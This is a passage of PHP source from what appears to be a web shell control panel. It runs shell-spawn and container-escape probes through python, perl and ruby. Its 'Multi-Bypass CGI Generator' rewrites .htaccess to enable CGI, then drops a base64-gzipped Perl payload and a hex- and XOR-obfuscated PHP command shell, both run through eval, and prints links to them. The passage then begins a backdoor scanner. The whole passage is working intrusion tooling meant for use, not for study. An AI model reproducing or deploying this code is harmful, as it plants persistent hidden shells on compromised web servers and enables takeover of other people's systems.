dev/ptmx if accessible.' ], [ 'title'=>'Escape with nc, curl, wget', 'cmds'=>['which nc;which curl;which wget'], 'desc'=>'Check if remote file tools are present (for pulling escape binaries).' ], [ 'title'=>'Shell/Interpreter Injection', 'cmds'=>['python -c "import pty;pty.spawn(\'/bin/sh\')" 2>&1','perl -e \'exec "/bin/sh";\' 2>&1','ruby -e \'exec \"/bin/sh\"\' 2>&1'], 'desc'=>'Tries to spawn interactive shells using interpreters.' ], [ 'title'=>'/proc/1/cwd / root', 'cmds'=>['ls -l /proc/1/cwd', 'ls -l /proc/1/root'], 'desc'=>'Enumerates host working dir and root dir.' ], ];
       $step=0;
       foreach($jBmcR as $method){
        echo '<div class="terminal-prompt"><b># '.$method['title'].'</b></div>';
        echo '<div class="terminal-out">'.$method['desc'].'</div>';
        foreach($method['cmds'] as $pr1pr1v){
          echo '<div class="terminal-cmd">&gt; '.htmlspecialchars($pr1pr1v).'</div>';
          try {
          $out = xfnQ1v($pr1pr1v,2,8192);
          $clean = trim((string)$out);
          $fail = (
            $clean === "" ||
            stripos($clean, '<?php') !== false ||
            preg_match('/<!DOCTYPE|<html|<head|<body|Permission denied|not found|fail|error|cannot|invalid|TRUNCATED|TIMEOUT/i', $clean)
          );
          if(!$fail){
            echo '<div class="terminal-out">'.htmlspecialchars($clean).'</div>';
          } else {
            echo '<div class="terminal-fail">[FAIL] '.htmlspecialchars($clean ? $clean : 'print fail').'</div>';
          }
          } catch(Throwable $e) {
          echo '<div class="terminal-fail">[FAIL] Exception: '.$e->getMessage().'</div>';
          } catch(Exception $e) {
          echo '<div class="terminal-fail">[FAIL] Exception: '.$e->getMessage().'</div>';
          }
          $step++;
          usleep(25000);
        }
       }
       echo '<div class="terminal-prompt">[commands completed!]</div>';
       ?>
     <?php endif; ?>
    </div>
    </div>
  </div>
</div>
<?php elseif (isset($_GET['multicgi'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon"><i class="fas fa-ghost"></i></div>
    <div>
    <div class="pzcard-title">
     <b>Multi-Bypass CGI Generator</b>
    </div>
    </div>
  </div>
  <div class="pzcard-content">
    <form method="post" style="margin:22px 0 20px 0;">
    <input type="hidden" name="deploy_cgi_suite" value="1">
    <button class="pzcard-btn" type="submit">
     <i class="fas fa-biohazard"></i> create cgi 
    </button>
    </form>
    <?php
    function prvdz_rndstr($l=8) { $a='abcdefghijklmnopqrstuvwxyz0123456789'; $s=''; for($i=0;$i<$l;$i++) $s.=$a[rand(0,strlen($a)-1)]; return $s; }
    function prvdz_ascdump($s) { $r=''; foreach(str_split($s) as $c) $r.='&#'.ord($c).';'; return $r; }
    function prvdz_xor($s, $k=0x29) { $r=''; foreach(str_split($s) as $c) $r.=chr(ord($c)^$k); return pr1vdxs($r); }
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']!='off') ? 'https' : 'http';
    $domain = $protocol.'://'.$_SERVER['HTTP_HOST'];
    $dir   = rtrim(dirname($_SERVER['SCRIPT_NAME']),"/");
    $paths = [];
    if(isset($_POST['deploy_cgi_suite'])) {
    $cgidir = 'pr1vd4yz_cgi';
    if (!is_dir($cgidir)) @mkdir($cgidir,0755,true);
    $htaccess = <<<HTA
#by www.privdayz.com
Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .d4yz
AddHandler cgi-script .d4yz
HTA;
    file_put_contents($cgidir.'/.htaccess', $htaccess);
    $plf = $cgidir.'/pr1v.d4yz';
    $pl_payload = '#!/usr/bin/perl   -I/usr/local/bandmin
use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64("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")));';
    $asc = prvdz_ascdump($pl_payload);
    $f = fopen($plf,"w"); fwrite($f,html_entity_decode($asc)); fclose($f); chmod($plf,0755);
    $paths[] = ["CGI Perl Special", $plf];
    $phf = $cgidir.'/'.prvdz_rndstr(9).'.php';
    $cf1=prvdz_rndstr(5); $cf2=prvdz_rndstr(6); $cf3=prvdz_rndstr(7);
    $php_payload = <<<'PHP'
<?php $ve017499b24="366f3971556a482a3966526e26334d65666565626432336536666339316336392454704c237a313940425e6137642158";$v6789ef794d='';for($i=0;$i<strlen($ve017499b24);$i+=2){$v6789ef794d.=chr(hexdec($ve017499b24[$i].$ve017499b24[$i+1]));}$v6789ef794d=strrev($v6789ef794d);function fc726c15f02($be0647970224518ac6c7abd9ee879da39f7){return hex2bin($be0647970224518ac6c7abd9ee879da39f7);}function ffe80814332($be0647970224518ac6c7abd9ee879da39f7,$e3d26b8f3fb594246){$e3d26b8f3fb594246Len=strlen($e3d26b8f3fb594246);$a297955cd64439654e8031e1e='';for($i=0;$i<strlen($be0647970224518ac6c7abd9ee879da39f7);$i++){$char=ord($be0647970224518ac6c7abd9ee879da39f7[$i]);$f93700fcddba236015a=ord($e3d26b8f3fb594246[$i%$e3d26b8f3fb594246Len]);$a297955cd64439654e8031e1e.=chr($char^$f93700fcddba236015a);}return $a297955cd64439654e8031e1e;}function f0fe28bdc4c($be0647970224518ac6c7abd9ee879da39f7,$e3d26b8f3fb594246){$eb7f6b8164569b7c36e1=fc726c15f02($be0647970224518ac6c7abd9ee879da39f7);return ffe80814332($eb7f6b8164569b7c36e1,$e3d26b8f3fb594246);}$vfa90f6f087="641e145f1153486050575a0b682f07616b60266362413a0757016e555250391e507c6f175c673a081a7d3664430a334e6d15380652691e71080426127c45085c0c023f0008533a0754046e1c5651473b45700e1b4e703a411e7f362d450c33076a15461e412562285c501e463e5876780806506d0856516a540604381a52513a1d7b067a5f675065527f5e09440c33076a15384f56671e380e01265b7a45085c0a573f490e573a4e53066e1c555d395753796f13590e1e0f12141262456517003c7d1c0102023a735b6d4e1310416017654e5509651b5007394b05563e545355397c0713322a510d763059312d085d03041056033d26767665044f7f34436c06100d430e076e6c0a0d475f085c590d0304290d1a1a3b12554f76447a555a025278431d47002d31604a59494f205028044e41141f49110f4001524b1e4c060a0b5962474f1a3e0307163b1e2c1d5c515437451d4c033f212b5e43155622146e075f50050a5a0c0a591709110157565c555076554900264b5f4b25033908030259364e1747003d273d5b440e57231e784d57461645420107550e54400b170b015c462b57430d3705024927063a03034c536d125d045465202f4b551f517641245c19450c5d500746150006015d51505e160429574f00355c015a304a644549170d354016500830787749495a1377123b565d53111c4b02025f10400853121d1816172848440f310d5e58271f3b15034c503e4753515665212f555e08196f1561170005560a490202520c5d555e5356151e457c0b5616690456582c0f275c4b0e523154170d506e3238025c1b512b193a094d59130b0854164e5e515d1c4f160d070122441c5e72544952685b6701414f153d14570e526b7070025e0c463e16384b4e0c02444d0c1b571e505d080d175f45077a02455f311b79472d0e3c10110257200c135e052a2a7a0f014a5334592f464c42175e574f0f58154646481217001d1224575206685f0e5c3f17284d161c42214d01095d2d213250410e1d2a053a474d5f0c5f1907540401040a0707545454502e56155d7a14155e611139144d4f53744e591543722c7d4d1f194b2d02174b5d53224511534f0d035c404c0758555d007141080237085e5e2051305a124659731c374313372c271757084c21333c454b750c555c4b1418065b5316210a010324391b43470c0810113a0f21044b0116375c693d173f3060580c21127c44781508004f0008554a0754011e55535049535d61071142665115137146644109430769114803577273710b1d4b12785c65140c1a5200014f5706551f0b534e545757497c01144266501513714664400843076818390c173f30605b0c21177b5c65140c1a5201004f5f01490202574e545557497c021342665164113e0b27515a526d69115c1b506f736c0801490f7d41650800034f00085b4a03556e091203174502581607104263570b06795b655d085f05052c6e5114302134505e140339582408481a111d4a4a1d40044112105f154b050a2350471a7a17155864197c4a4f0e44785210455c79657b5f5e080b3a112604500b530a505f121809565c03160d5e0f4e661a5d1d261412171b1e27185708183e530b5a223623327a5e1e4664040f4d641f1e3c3311034210415c441111171b684755530031125045264a235941464d2a441042133062224d5e1b0b345929293350165f5a170f590b13515d5655555e077e0b470c3304011b714221584203532c01010a437c79265643524f2904744a0406585f0517485a005d55100a5e0b4d4e64560d537a440908631e7b12510e441b4e0052202a6a2e101f0e4c1f04264d57514b000f4a4f18165f5b07074d48544c7641431a2714570a2d17587b1109433642105e0e3062230d054a167d4331425c52070101515707071b1b1f140417461d25411b003711197205261d054d1f643d501152122a6a6902491251621f2441571e44617630321149461a054e07490549291a0a4f624f025220187b025c1b643d501152122a0a2558551f516457174b5742065f4d4e324f1556154845041516092450471a3b095705304722064e42503753091a142c2e25575215472914730d024e0b4317100358011b15020b09005b4266450e023d05585e21053b5f511d533e084d4a48766b49343b1c562213204d565843555b57515056050501045007045d7c0a0e0b7b1d554f3c4a3b4c5c4145284d0d43497c606917431f5529022741111f4d5b560a081e47111b48105801545729041e0d375708187d0930420a475874032f15486530254d44084d6c136d1009065b530a5b075404510a555b4d174f184039401b3c054d432704751e571c433a09111e1a3227341954475662136f565c4216435743031813525e1107580104517a55155865035f1f2a086d400047537657055b143b6b6c1801071f630337565046170f054c0e5304570c58000a011f5b715b145021125c4b241e3d511740123b4c0017032732214a425a5f6c072353174611584f07074f1f1d510b0f594a0e57730f191e3a16190a6c356551044f5f2b520143497a1d077c652101104160171b6b4a11064342692276663f40395452566f6e065472411e11680c201f5a1b5f374f4454003c75770e5743132d426647080f4b1566524f161e13163b50455846426a0806083d1419026c356651044f0663014068527e7e604a45084f291e7c0066074a0a1947390545180f44504c451d45696c144e7c5b194920187d195c17523d424c133e6f1964660227036250707b086d476e0a434d16546e1b4d59451846172847531c3c461d757a51750c1909433642105e0e3062240b031e1474133115080456525c50551e416c064842413a534c6d48064a0d541917684d724a194b696e0159170e2c26681d6e4f787c2d7d1f19500c43194b426956130f44525e45423a7e131a4e21124b462d047d55665b1f6301406852756969194a5a071342740a041600594b4b0944011b163b563e413956101a06307242661c6151750c191d532c541659417a1d7202110703682f63040416441602430f50451b163b524c451d45696c1e4e6f465d187a0e62495a0a0769135154046d71685a5018147b47321d095751035a525f1e416c024d4e45473a547c00044769461d757f4a68514a1b442a44121f45017a6902110703291c2741194d43156654460b45116e1c545c395751796f115d0e570f1f145b6047651700697d5502540273740c6d02117c2c2c165d6a520508415d16181357070a0a4544397a077a16645065527e0c09400f5d6a2017006b556e1e380f552612784508150f023f490f5b3a0750046e1c5451391e56296f12590e57091d145b6544655e046c7d50003d26707065004f1410416112654e5402651b5103390206563e1d5302397c0617322a510d763059312d415d01041052053d26747565004c1710416211654e5403651b5053390702385350523a5478057a166555651b7e5f09090f5d6a6d11384f566a1e380f09265b7a49085c0e053f04083f5105390705385553391e04114b150d0e1e0f13145b6047651701687d550154023a770d6d4e131008624165075700651b5052394b04513e52503a517a6f175a613a0d1d14126741655e006e7d1c0150023a765a6d4b15792c2c120c6a1b025d3f5201394b00533e1d56033935527a59663a081e7a362d460c33076e15384f566a1e380f57265b7a15085c0a533f490f543a00556f4a5701395051393505143263500c76305d612d415802041051003d26742565494946100835784105006d0c543a0751056e5557523957537f6f5e58363a41192d366245655e00687d550153023a760c6d021029526f045f430d524d0a09584550034c463a5c4f453613540b26134b44680338015500523d0943104d7e23324b50037c2111240c5f430d524d0a0958451b163b53554c461e6d41431a2714570a2b0227591d300768085f171c7262646608530a775029045f430d524d0a09584550004c463a5c4a45696c175f7b46420a6c3564431952167f065f1707313060111525106c4d74140216476e0a435a1616474008070b4d423a741a1d4e76390a016343750a194b69691344195c7e21284b1915512858707b006d476e0a3e4f163b13163b53544c5d453013540b26134b44684e0a400b5416250102420f3d3629565f5a407f58707b001f434a1911034210415c440004160353796c420b31095d4f604e0a48105416250102420f3d3629565f5a407858707b001f434a1947390756130f4445425e46032241430f310e19023b1e272e4a1f5a31554c133e676b6058425a071341650d194d4315665255164b0e12463e1d53553935051e3263500b767d5a7751174f592a454c133e6f7369191f5a011008661d1b164d111b3f53004708121942170012103f5d061d27044a5e3a42712e085c1a781148174c6f6b7b194c5a45391e375050590d115a564e123a0a1b4419451703113841484e38095044604d725d191c422a7e17470d3736681d6e430a654b745919123c000d435b16044140051b4d06574d2c41540f2b4e081b7d4675400b5e1a781055024d7e73710f1d5a127c41780408065a18104f4655541b531610041c4e547c060a4e63560d06685b6540154f0768194817506e7a6c19084f0f6c41641515165203094f460755021e445b5c4c4f496d501446703a411c7e362d475c33076c15384f576e606c1907530f6c13650c58441150404b5707571f125d5549455754781f065f6353150a795b635d195e066c0d4406506a6e6008004d0a655c7447081e02434b021f1e5402004842545457496d02175c7e46081a79467540085f1f710d44545376601c0804497f7d4561780803546d0850506a540702385353573a547b027a5f64561b06685e7c5d190c077040164500276a7108035603754978040807531d19525700491303545a49455f506113175e634a191b7a5a7951085f0774015d0e48776e605a0052423e02355d110f541d195257034913035557494557557c1f065f6352150a795b63581043163b104c56132c233911004a1260506515011a43080e4f4607550b1b4d4b5e450010235052073d08195a3a5b23414147120710511e4125626466035a1e6c57731f19123c000f435b1625435d14070b4d423a7c060640724465527a5a09470b33016e7d1c05570274711b1d5a01100863161b1f58115005461e416c03524b451e4612255a4a0b724e184c2d0533591d30076e084d171a7e661f0b11541e6c16264158524b156652501a450102505a4c5e46186d4345023d155c026c35644710541625011652152b302e19152511775029045f430d524d0a09584543405614551d4e4112021347721d190e1758754c194811630140685069627d195008512d097c15190b5d11581114571c1b10381a52553a5478027a166556651b7c5f775d194d6a6917531548726272190c44032d022645401e416d0855566a540603381a52553a1d7b0604427244651b7e5d77581054167c7e550f4163620049431540131f2441571e476e0856461845116e1c5055395057110410322a540f767e5b775d194b696916481745017379100a5a4a2a507c4d4a6911544a0c134406561a403d545d4f4c6d48064a0d541904754a26054b0a57357e03521501212f57451f4d38037c0066075a6a083e4f0d455551080d16004e4112021f35633b1011684e0a4319410b78521045043f2f1f5e540e7c2f1f3a505c581742114739075c6800394b5e450006215c550b7a42661b7131672c10541628530b543e3d2e2f4a54520713416c0d02161e114b061243175d12403d575e46186d55530031125045264a25030b0c0620094068506b6b60421113456c58325157551758560d39531d5a4110114d473a547b037a166455651b7d5c09090e5b6a2017076b506d751c41074f7f7d4764784100566d085755144c1a121f42413a54556d0e064c0e530f76305833531941162d4f0d46083a6a6265494d101008621c1b1f431f19413a03536f4a5356395451551102105a705d196a38093b055530532044071f4302777765494c111008621d65075607651b5450394b05573e1d535e476113471c200740026a362d435d334e6e12461b417c396466004f5e10086614654e505442473904554e6e5052391d5557110410322a540f763059645310460d7848021749382b2c5c6e1f5b2503205711123c03094a4f161e13163b5054455b450d554f0237395e4f3c35361e571b533655171f45017070100a5a56221c3d4a521e476e0b534f0d4541571017170b464112011755721b1957681830054c1d587806430c4123626466034803715035564b571a19105846500a415705010d454e411202124e3315190e175866581914167c7e56053a03627d19570f4d2f043d4b57164b156652531f454641014a413a545664135d4e3b0019026903262e5a0e5a3440065b0476661f0b02530a6c0b74565c421643574300570940575f42184514003946540072265a4b24060a044a0a44074711590276661f0b025603682f6511100d434c02434269570169394258450010235052073d0819026c356444104f432b444c133e6c7169194a5a512904215657162352580f0a69104057163d031008066551471d37500d752c0f361e5d0a1e3a401752576a1d25575215472958707b0b054a181543426954061b5f42185e4641120114350f46040a2e1f3b124d065936014c133e6f77691944094664540b160a1f434a1911034210415c442206040a091246550b20395f5f26097d1b5606587006431b412d363266420a4f25047c0066045018104f46123a02074d5945185d45696c145c093b1917680c201f5a1b5f374f441f4501737510110f502958707b0b054a1142434269570712594242425d452b5c540b3305510a60192103661c463448101f4501707310111b506c540b160c1f434a1947390451131c5942473957517e6f175b623a411d7a3660411b4f18784e1653497a1d720c185a0d6c5208110814431f19413a03531109441f4541395779131b4e21135b593c187d55665d027401541b41737369021108463805264a19760647580f4e14390706385351533a1d7e57044e7c461d757a5e755f194d6a6f12384f566c1e380f04265b7b44085c0e033f000f513a4e53566e505239545655114b145a0e1e0f1c141267496517046c7d550352023a765d6d0215782c6115654e50531b4a5d161808121942413a5457166e065372004c442b1e3c1e574f1e7c7e5502487e39604b540e563e1e74645c40025d1147390750131c4440395255476408061369461d757a580e2c1952163e540a5415372d2e19195e7c7d457d04421611544d16145845735317110017124d696c175b72481908141266131b460d785c5f1745017072626c5a1e6c16214a5a420a5e57434e123a02074d421e45423a7f05065372085c5d68383017550a552c480b59272b2c234d58154d641326415842066e5f160855115a5d0a4a42424a456f6f5e59603a411c7d362d460d33076e14384f566c1e710c0726177c2c6215654e50531b4a4f0d45176d565545584641120110436c015c5e060b381411460d78480217497a1d720e185a586c0231504c440d117900075a096c471707173a001023500e4a0d540e06684e0a400c460d785c4445042a373257115d047750291f19123c030b383b16581354110c06110f0a23130e4a0d570c03681175035c1b432a4f4447136f347041195e7c7d457d1f194b58111d3c54043e6e12594203100806395a4900724e1d75795f7c51424f443d5511450f7e32320b474a5b64540b150c1f5811445846123a01003f3f45584603385d451a3b09570a604e0a400c4616230140685366627d196e2565053c117b660d431566515f165813540d0e003a0100396c45013c125c443c197d55665d0e711a445e077e6a334d430a4c3f58707b0b0f4f111b3f5101394b0101404c4547587013400f3e155c0368117555665c06781c4444143c31344b195e7c7e4978044a42114156104e123a010b4842473951521104104c7b46120a7a436e51444f53345201171a7e661f0a015a1e6c57731f194b435e5b3c15420441464c4b5e4526003b524a4676390a1a61517555665e04781c4458030125254d6e194f29113a0c100d43435c1713440b13163b53575e46187613023160546277685775174c01552c480b594176661f08045303375026414d43115f1913140406034a4c463a54534c76135b55724266187a310851044f502d4f074308312c60111525127959745f19123c0309435b16476f4a5607395051476d1d061b3c0f48432c42772d4158050459520f3d6f75701b1841032a193841664616456600095811565c10114d4139577d1f064c0e520a763058642d0c586a6915566b506b731c41071f7f7947085c0e053f000c533a4e0448163b5350183a1d2c110f5572055147270e7d55665d067401500e527779601d6e48126c4d744442123c03091e46045b1503045945100809245d4d4676390b1a615175035c1b432a4f44133e6c737b194c4103682f6715190b43504b11074f4d55470a01110c090b6d1b02316154100a334a27144d1a4436014068526c7960441d5a45391e375050590d1111473905571a121f42170012103f5d060c33155c1c7c3531145a00523d090656123b7474665414402314310c1d695003104a5d16181f1202170b06120c225d064676390a18614a2e511d30076a015917467979601d6e49106c4d74150a0d43575611461e416c01445f45555d45696c154e6e464a5e3a06301f114b696b134d0c417a1d73121a53033750707b0804431f0443055e171b5d16064d4139567f1a0630724266197b436e51444f443d5511450f7e661f08034103315c74424c580045500c08164d176d57504c451d45696c155a725b190d6f517517561d1670053b044163627002115e7c7f5068044a42115d5c0d4e123a00004d594541395666180f4e29461d757b5e755f044f14045951543d6f75701b1154032815374c5c4e4b5e4b074e123a00003f463a563b4c6408061372145c5e3d183b511d30056c1a444a4d7e243557520e4a231e740c1d69500310431d1617564611100b450f083d5f490a374e1b7630583053154f572a53054e3e33233011570f4d2f043d4b57164b156652561f45481216071110140b6d117a5f6655651b7d5a09400f5d6a20135c154170622f4b5552071341640d19184313655657145e134f48421611143a3e434a07264e1d757b587c5810541625085f1745017175190c5a046b4b7442564406505a0b461e416c0056420416464112001047721d194c271830105a071670053b04507e2333191525107b59745f19123c0201435b16416c01534a413a514c76130231615f1917682a712e0a591e7c7e570f486562295f11520713436d041f1043454b0a0b1e416c015d4b45445b586d140147721d190e17596051044f1207125d0c413c3025585a5a117750290444161e115005461e44176d57574c451d45696c155b725b1908145b6642655e036e7d1c010702767065004f141008631165075505651b5106394b05513e1d52523979037a166400651b7e5809090b5f6a2017566b506b761c41071c7f7d4467780803506d4155536a540706381a5001445e6d4e060b310e560a201e381d4a1f533b48055b023623324a195e7c7f457d1f195300595643446a1d0051381a57033a547b037a5f6454651b7c5f09460f334e6b42380256023a760b6d4b167b2c2c120d6a5206083f1e05006f05503e50523a5478037a5f645265527e0e09090f0c6a201201155a7e26295c0a5a5e6c4f6a";$ve5c970b653=f0fe28bdc4c($vfa90f6f087,$v6789ef794d);if($ve5c970b653!==false){eval("?>".$ve5c970b653);}else{echo"RSS Error.";} ?>
PHP;
    $f = fopen($phf,"w"); fwrite($f,$php_payload); fclose($f); chmod($phf,0755);
    $paths[] = ["Php c0mmand sh3ll pr1v", $phf];
    $fullbase = $domain . ($dir ? $dir : '');
    echo '<div class="pzcard-alert"><i class="fas fa-biohazard"></i> <b>CGI deployed! All chmod 755.</b><br><ul class="pzcard-shells-list">';
    foreach($paths as $sh) {
     $rel = $sh[1];
     $url = $fullbase . '/' . $rel;
     $link = $url . '';
     echo '<li><b style="color:#e53935">'.htmlspecialchars($sh[0]).'</b>: <code>'.htmlspecialchars($rel).'</code>
     <a href="'.$link.'" target="_blank">Open</a>
     <span>(chmod 755)</span>
     </li>';
    }
    echo '</ul></div>';
    }
    ?>
  </div>
</div>
<?php elseif (isset($_GET['filehunter'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon" style="background:#374151;"><i class="fas fa-shield-virus"></i></div>
    <div class="pzcard-title">
    <b>backd00r scanner</b>
</div>
  </div>
  <div class="pzcard-content">
    <form method="post" class="pzcard-form" autocomplete="off" style="margin-bottom:22px;">
    <div class="pzcard-form-row">
     <label class="pzcard-label">Scan Root:</label>
     <input type="text" name="fhscan" class="pzcard-input" value="<?= htmlspecialchars(getcwd()) ?>" style="min-width:320px;">
     <button type="submit" class="pzcard-btn pzcard-btn-dark" style="margin-left:13px;">
       <i class="fas fa-search"></i> Scan
     </button>
    </div>
    </form>
    <div id="fhunter-output">
    <?php
    $fnc_obf = function($s){return implode('',array_map(function($c){return chr(hexdec($c));},str_split(bin2hex($s),2)));};
